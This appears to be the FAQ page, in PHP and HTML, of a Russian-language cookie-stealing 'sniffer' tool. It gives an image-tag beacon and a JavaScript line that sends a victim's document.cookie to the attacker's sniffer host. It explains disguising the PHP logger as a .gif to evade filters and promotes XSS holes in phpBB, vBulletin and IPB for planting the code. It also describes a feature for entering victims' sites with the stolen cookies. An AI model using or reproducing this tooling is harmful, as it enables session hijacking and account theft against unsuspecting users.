<?
define("FILE", "faq.php");

require "config.php";

if ($styles_enabled) {
	if ($_GET['style'] and file_exists("styles/".$_GET['style'].".css")) $style_filename = $_GET['style'].".css";
		elseif ($_COOKIE['s_style'] and file_exists("styles/".$_COOKIE['s_style'].".css")) $style_filename = $_COOKIE['s_style'].".css";
	$current_style = substr($style_filename, 0, strpos($style_filename, ".css"));
	setcookie("s_style", $current_style, time()+7776000);
}
?>
<html>
<head>
<title>Сниффер - FAQ</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<link rel="stylesheet" type="text/css" href="styles/<?=$style_filename?>">
</head>

<body>
<p>
1. <a href="#use">Использование сниффера</a><br>
2. <a href="#interface">Интерфейс и настройки</a><br>
3. <a href="#bugs">Неполадки</a><br>
4. <a href="#contacts">Обратная связь</a><br>
</p>
<p>----------------------------------------</p>
<p><a name="use"></a><b>1. Использование сниффера</b></p>
<p><b class="col">Q: Какой код нужно разместить на&nbsp;странице, чтобы сниффер перехватил данные пользователя?</b></p>
<p><b>A:</b> Чтобы перехватить IP, USER-AGENT пользователя и&nbsp;URL, с&nbsp;которого был вызван сниффер, достаточно разместить на&nbsp;странице тег <code>&lt;img&gt;</code>, в&nbsp;который прописать путь к&nbsp;файлу <code><a href="s.gif" target="_blank">s.gif</a></code>, расположенному в&nbsp;директории сниффера. Вот простейший код:<br>
<blockquote style="margin:8px 0 5px 8px; padding-left:4px; border-left:2px solid;">
<code>&lt;img src="[путь к&nbsp;<a href="s.gif" target="_blank">s.gif</a>]" width="1" height="1"&gt;</code>
</blockquote></p>
<p>Тот&nbsp;же эффект будет достигнут, если вы&nbsp;вручную наберете в&nbsp;браузере адрес картинки-сниффера. Помимо вышеуказанных параметров, снифферу можно передать в&nbsp;запросе произвольную информацию, отделив ее&nbsp;знаком <code>?</code>. В&nbsp;логе она окажется в&nbsp;поле QUERY. Если вам нужно перехватить cookies пользователя или иную информацию, известную только браузеру, не&nbsp;обойтись без использования JavaScript. Пример кода, перехватывающего cookies:<br>
<blockquote style="margin:8px 0 5px 8px; padding-left:4px; border-left:2px solid;">
<code>&lt;script&gt;img=new Image(); img.src="[путь к <a href="s.gif" target="_blank">s.gif</a>]?"+document.cookie;&lt;/script&gt;</code>
</blockquote>
</p>
<p>Разумеется, если у&nbsp;вас нет прямого доступа к&nbsp;странице, на&nbsp;которой вы&nbsp;собираетесь разместить код, ваши возможности разместить его &laquo;как есть&raquo; будут весьма ограничены. Для этого умные люди придумали, как использовать недоработки в&nbsp;программном коде страниц, чтобы размещать на&nbsp;них вредоносный код. Уязвимости такого рода называются XSS (Cross-Site Scripting).</p>
<p><b class="col">Q: Где прочитать про использование XSS-уязвимостей? Каким уязвимостям подвержены популярные движки форумов типа phpBB, vBulletin, IPB?</b></p>
<p><b>A:</b> Например, здесь:
<li><a href="http://antichat.ru/crackchat/HTML/" target="_blank">Справочник по&nbsp;XSS</a> (Antichat.ru)</li>
<li><a href="http://ha.ckers.org/xss.html#XSScalc" target="_blank">XSS в&nbsp;примерах + Character Encoding Calculator + IP Obfuscation Calculator</a> (ha.ckers.org)</li>
<li><a href="http://www.securitylab.ru/search/index.php?q=phpBB&where=iblock_vulnerability" target="_blank">Уязвимости phpBB</a> (SecurityLab.ru)</li>
<li><a href="http://www.securitylab.ru/search/index.php?q=vBulletin&where=iblock_vulnerability" target="_blank">Уязвимости vBulletin</a> (SecurityLab.ru)</li>
<li><a href="http://www.securitylab.ru/search/index.php?q=Invision+Power+Board&where=iblock_vulnerability" target="_blank">Уязвимости Invision Power Board</a> (SecurityLab.ru)</li></p>
<p><b class="col">Q: По&nbsp;какому принципу работает сниффер?</b></p>
<p><b>A:</b> Как только снифферу приходит запрос от&nbsp;браузера пользователя, выполняется php-код, спрятанный в&nbsp;картинку, фильтрующий и&nbsp;записывающий полученные из&nbsp;запроса данные в&nbsp;текстовый файл. После чего сниффер возвращает браузеру прозрачный GIF-файл размером 1&times;1&nbsp;пикселей (<code><?=$image_filename?></code>), а&nbsp;записанные данные становятся доступны через лог. Стоит отметить, что сам сниффер тоже имеет расширение <code>.gif</code>, что позволяет ему обходить фильтры, пропускающие только адреса картинок, и&nbsp;не&nbsp;вызывать лишних подозрений у&nbsp;пользователя.</p>
<p><b class="col">Q: Для чего нужна функция &laquo;Фильтрация запросов&raquo;?</b></p>
<p><b>A:</b> Благодаря ей&nbsp;данные могут фильтроваться еще до&nbsp;попадения в&nbsp;лог, что позволяет отсеивать ненужную информацию. Вы&nbsp;можете задать условие, по&nbsp;которому будет проверяться каждая новая запись, и&nbsp;при его выполнении запись будет отклоняться. Недостаток этой функции один: сниффер будет работать чуть медленнее на&nbsp;каждом запросе.</p>
<p><b class="col">Q: Как сделать так, чтобы вместо прозрачного GIF показывалась моя картинка?</b></p>
<p><b>A:</b> В&nbsp;<code>config.php</code> задать другое значение переменной <code>$image_filename</code>.</p>

<p>----------------------------------------</p>
<p><a name="interface"></a><b>2. Интерфейс и настройки</b></p>
<p><b class="col">Q: Где настроить сниффер?</b></p>
<p><b>A:</b> Все установки сниффера &#151; в&nbsp;файле <code>config.php</code> (с&nbsp;комментариями), откройте его в&nbsp;любом текстовом редакторе.</p>
<p><b class="col">Q: Как быть, если нужно выделить сразу много записей в&nbsp;логе?</b></p>
<p><b>A:</b> Клик с&nbsp;нажатой клавишей Shift позволяет выделить сразу несколько записей, идущих подряд (или снять выделение).</p>
<p><b class="col">Q: Для чего нужна функция &laquo;Волшебная палочка&raquo;?</b> <img src="img/wand.gif" width="17" height="16" border="0" alt="Волшебная палочка" style="vertical-align:middle;"></p>
<p><b>A:</b> Эта функция позволяет быстро зайти на&nbsp;сайт, с&nbsp;которого пришел запрос снифферу, с&nbsp;использованием cookies, полученных в&nbsp;QUERY. Это очень удобно, поверьте. В&nbsp;случае, если вас раздражает эта функция, вы&nbsp;можете отключить ее&nbsp;в&nbsp;<code>config.php</code>.</p>
<p><b class="col">Q: Можно&nbsp;ли добавить свой стиль в&nbsp;сниффер?</b></p>
<p><b>A:</b> Можно. Для этого вы&nbsp;должны создать свой CSS-файл в&nbsp;папке <code>styles</code>, перенеся названия классов из&nbsp;других CSS. Обратите внимание, что в&nbsp;первой строке файла вам следует должным образом закомментировать название стиля.</p>
<p>----------------------------------------</p>
<p><a name="bugs"></a><b>3. Неполадки</b></p>
<p><b class="col">Q: Возникает ошибка: &laquo;Не&nbsp;удается получить доступ к&nbsp;[имя файла]&raquo;.</b></p>
<p><b>A:</b> Читайте техническую информацию в&nbsp;<code><a href="readme.txt" target="_blank">readme.txt</a></code></p>
<p><b class="col">Q: Я&nbsp;установил все права на&nbsp;файлы, но&nbsp;сниффер все равно не&nbsp;хочет работать. Что делать?</b></p>
<p><b>A:</b> Проверьте следующее:<br>
<li>хост, на&nbsp;который вы&nbsp;устанавливаете сниффер, поддерживает PHP и&nbsp;работу с&nbsp;файлами (чтение, запись);</li>
<li>хост, на&nbsp;который вы&nbsp;устанавливаете сниффер, позволяет вам использовать собственный файл <code>.htaccess</code>;</li>
<li>если пункт 2&nbsp;не&nbsp;выполняется либо у&nbsp;вас нет информации об&nbsp;этом, переименуйте файл <code>s.gif</code> в&nbsp;<code>s.php</code>&nbsp;&#151; сниффер будет доступен по&nbsp;новому адресу. Правда, в&nbsp;этом случае будет разрешен прямой доступ к&nbsp;<code><?=$data_filename?></code>, а&nbsp;ссылки и&nbsp;упоминания <code>s.gif</code> в&nbsp;исходном коде станут некорректными;</li>
<li>если записи все равно не&nbsp;появляются, попробуйте поискать другой хост для размещения сниффера. Мой совет: остерегайтесь бесплатных серверов с&nbsp;поддержкой PHP, в&nbsp;крайнем случае, ищите хорошие зарубежные хосты (в&nbsp;России качественных халявных серверов мне не&nbsp;известно). Например, <a href="http://stpwebhosting.com/" target="_blank">stpwebhosting.com</a>.</li></p>
<p><b class="col">Q: Записи добавляются в&nbsp;лог, но&nbsp;возникают неполадки с&nbsp;интерфейсом сниффера.</b></li>
<p><b>A:</b> Проверьте, включены&nbsp;ли у&nbsp;вас cookies и&nbsp;javascript. Если включены, но&nbsp;ошибка повторяется, свяжитесь со&nbsp;мной.</p>
<p><b class="col">Q: &laquo;Волшебная палочка&raquo; не всегда корректно отображает страницы...</b></p>
<p><b>A:</b> В&nbsp;нее вносятся исправления. Если вам не&nbsp;лень, вы&nbsp;можете связаться со&nbsp;мной, прислав URL некорректно отображающейся страницы.</p>
<p><b class="col">Q: Не работает базовая авторизация.</b></li>
<p><b>A:</b> Это тоже зависит от&nbsp;хоста. Если хост не&nbsp;дефектный, все должно быть в&nbsp;порядке.</p>
<p><b class="col">Q: Не&nbsp;приходят письма на&nbsp;e-mail.</b></li>
<p><b>A:</b> Скорее всего, функция <code>mail()</code> заблокирована вашим хостером.</p>
<p><b class="col">Q: Не&nbsp;приходят сообщения на&nbsp;ICQ.</b></li>
<p><b>A:</b> Если новые записи появляются слишком часто, номер может превысить лимит подключений. Если сообщения не&nbsp;доставляются вообще, а&nbsp;в&nbsp;настройках все верно&nbsp;&#151; скорее всего, опять виноват хост. Изменения в&nbsp;ICQ-протоколе маловероятны.</p>
<p>----------------------------------------</p>
<p><a name="contacts"></a><b>4. Обратная связь</b></p>
<p><b class="col">Q: Как с&nbsp;вами связаться?</b></p>
<p><b>A:</b> См. <code><a href="readme.txt" target="_blank">readme.txt</a></code>.</p>
<p><a href="#">#</a></p>
</body>
</html>